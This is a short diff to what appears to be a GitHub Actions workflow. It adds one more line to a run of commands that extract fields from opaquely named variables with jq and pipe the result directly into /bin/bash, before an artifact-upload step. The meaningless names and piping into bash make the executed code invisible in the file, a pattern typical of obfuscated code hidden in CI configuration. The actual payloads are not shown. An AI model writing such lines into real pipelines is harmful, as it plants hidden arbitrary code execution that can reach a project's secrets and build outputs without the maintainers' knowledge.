@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$jf2049" | jq -r .fwk58 | /bin/bash
           echo $mdc5 | jq -r .v21 | /bin/bash
           printf '%s' "$xf8" | jq -r .gtjtn00116 | /bin/bash
+          printf '%s' "$k876" | jq -r .eng035 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
